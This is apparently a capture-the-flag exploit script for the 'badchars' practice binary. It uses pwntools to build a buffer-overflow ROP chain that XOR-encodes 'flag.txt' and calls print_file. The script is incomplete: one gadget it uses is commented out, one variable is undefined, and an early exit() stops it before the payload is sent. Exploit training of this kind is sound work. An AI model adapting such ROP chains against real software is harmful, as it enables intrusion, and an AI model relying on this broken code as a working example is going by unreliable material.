#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# break break after read in pwnme
gs='''
b *pwnme+150
c
'''

# Gadgets 
# pop r14 ; pop r15 ; ret
pop_r1415=0x4006a0
# mov qword ptr [r14], r15 ; ret
#write_r14=
# pop rdi ; ret
pop_rdi = 0x4006a3

def w_write(addr, data):
    r=b""
    if type(data) == str:
        data=data.encode()
    for i in range(0,len(data),8):
        r += p64(pop_r1415)
        r += p64(addr)
        r += data[i:i+8]
        r += p64(write_r14)
    return r


def xorchain(chain, bytes, mask):
    r=b""
    for i,c in enumerate(chain):
        if bytes&0x80:
            c=c^mask
        r+=chr(c).encode()
        bytes= bytes<<1
    return r

# Offset avant ecrasement de l'adresse de retour
offset=0x28

# Set up pwntools for the correct architecture
elf =  ELF('badchars')
context.binary=elf

print_file=elf.plt['print_file']

data_section  = elf.get_section_by_name('.data')
data_addr =data_section.header['sh_addr']


flagxored = xorchain(b"flag.txt",0b00111010,3)
print("xored_flag", flagxored)
exit()

PL =b"A"*offset
PL+=w_write(bss,flagxored)
PL+=p64(pop_rdi)
PL+=p64(data_addr)
PL+=p64(print_file)

io = process([elf.path])
if sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)

# io.recvuntil(b"> ")
io.sendline(PL)
io.interactive()

